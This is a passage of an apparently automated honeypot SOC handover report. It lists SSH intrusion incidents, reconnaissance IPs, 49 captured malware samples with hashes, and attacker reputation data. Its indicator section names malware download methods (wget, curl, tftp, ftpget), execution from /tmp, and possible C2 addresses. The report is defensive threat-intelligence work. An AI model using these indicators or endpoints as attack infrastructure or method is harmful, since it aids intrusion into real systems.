| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:47:50` | `cowrie.session.connect` |
| `2026-07-13 12:47:51` | `cowrie.client.version` |
| `2026-07-13 12:47:51` | `cowrie.client.kex` |
| `2026-07-13 12:47:53` | `cowrie.login.success` |
| `2026-07-13 12:47:54` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]7` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054f2df99e82

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-07-13 12:47 |
| **Last Seen** | 2026-07-13 12:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:47:59` | `cowrie.session.connect` |
| `2026-07-13 12:48:00` | `cowrie.client.version` |
| `2026-07-13 12:48:00` | `cowrie.client.kex` |
| `2026-07-13 12:48:04` | `cowrie.login.success` |
| `2026-07-13 12:48:05` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:48:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4f838e98d04

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-13 12:51 |
| **Last Seen** | 2026-07-13 12:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:51:18` | `cowrie.session.connect` |
| `2026-07-13 12:51:18` | `cowrie.client.version` |
| `2026-07-13 12:51:18` | `cowrie.client.kex` |
| `2026-07-13 12:51:18` | `cowrie.login.success` |
| `2026-07-13 12:51:18` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:51:18` | `cowrie.direct-tcpip.data` |
| `2026-07-13 12:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **19** | 2026-07-13 11:08 | 2026-07-13 12:50 | 16m | 0 | `T1592` | 🟠 MEDIUM |
| `103.213.95[.]198` | **5** | 2026-07-13 11:19 | 2026-07-13 12:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]12` | **5** | 2026-07-13 10:56 | 2026-07-13 10:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]207` | **5** | 2026-07-13 11:52 | 2026-07-13 11:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-07-13 11:13 | 2026-07-13 12:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]187` | **3** | 2026-07-13 11:53 | 2026-07-13 11:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]190` | **3** | 2026-07-13 11:53 | 2026-07-13 11:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]243` | **3** | 2026-07-13 11:41 | 2026-07-13 11:42 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `104.143.10[.]174` | **2** | 2026-07-13 11:02 | 2026-07-13 12:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]13` | **2** | 2026-07-13 10:56 | 2026-07-13 10:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]14` | **2** | 2026-07-13 10:56 | 2026-07-13 10:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-13 11:54 | 2026-07-13 11:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]98` | **2** | 2026-07-13 12:53 | 2026-07-13 12:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `93.152.221[.]125` | **2** | 2026-07-13 11:24 | 2026-07-13 11:24 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `109.105.209[.]15` | 1 | 2026-07-13 10:56 | 2026-07-13 10:56 | 4s | 0 | `T1592` | 🟢 LOW |
| `116.255.226[.]73` | 1 | 2026-07-13 12:25 | 2026-07-13 12:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.198.99[.]18` | 1 | 2026-07-13 12:44 | 2026-07-13 12:44 | 10s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]2` | 1 | 2026-07-13 12:06 | 2026-07-13 12:06 | 13s | 0 | `T1592` | 🟢 LOW |
| `180.76.168[.]116` | 1 | 2026-07-13 11:47 | 2026-07-13 11:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `189.56.0[.]19` | 1 | 2026-07-13 12:35 | 2026-07-13 12:35 | 5s | 0 | `T1592` | 🟢 LOW |
| `196.188.93[.]169` | 1 | 2026-07-13 11:40 | 2026-07-13 11:40 | 1s | 0 | `T1592` | 🟢 LOW |
| `220.180.249[.]165` | 1 | 2026-07-13 11:28 | 2026-07-13 11:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.214.127[.]246` | 1 | 2026-07-13 11:40 | 2026-07-13 11:40 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]183` | 1 | 2026-07-13 12:46 | 2026-07-13 12:47 | 15s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]115` | 1 | 2026-07-13 11:18 | 2026-07-13 11:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]116` | 1 | 2026-07-13 11:18 | 2026-07-13 11:18 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]117` | 1 | 2026-07-13 11:19 | 2026-07-13 11:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]118` | 1 | 2026-07-13 11:19 | 2026-07-13 11:19 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]172` | 1 | 2026-07-13 11:21 | 2026-07-13 11:21 | 4s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]6` | 1 | 2026-07-13 11:21 | 2026-07-13 11:21 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `222.75.225[.]206` | CN | CHINANET ningxia province network | **100** ⚠️ | 50 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `218.95.73[.]31` | CN | CHINANET jiangxi province network | **100** ⚠️ | 50 |
| `111.70.10[.]15` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `92.255.196[.]185` | RU | CJSC Company ER-Telecom Kazan' | **100** ⚠️ | 50 |
| `117.198.99[.]18` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 12 |
| `109.105.209[.]14` | US | ICG-ZEN-LAX-1 | **100** ⚠️ | 50 |
| `198.38.91[.]219` | SG | WHG Hosting Services Ltd | **100** ⚠️ | 1 |
| `66.132.186[.]183` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `200.232.114[.]71` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 451 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 298 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 276 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 33 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 20 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 533 cases |
| Tool 34  | Credential Extractor        | ✅ 483 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 202 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 75 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (1.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 46 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 451 priority case(s) shown individually · 30 recon entry/entries in table (14 group(s) consolidating 59 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-13T14:43:06Z_
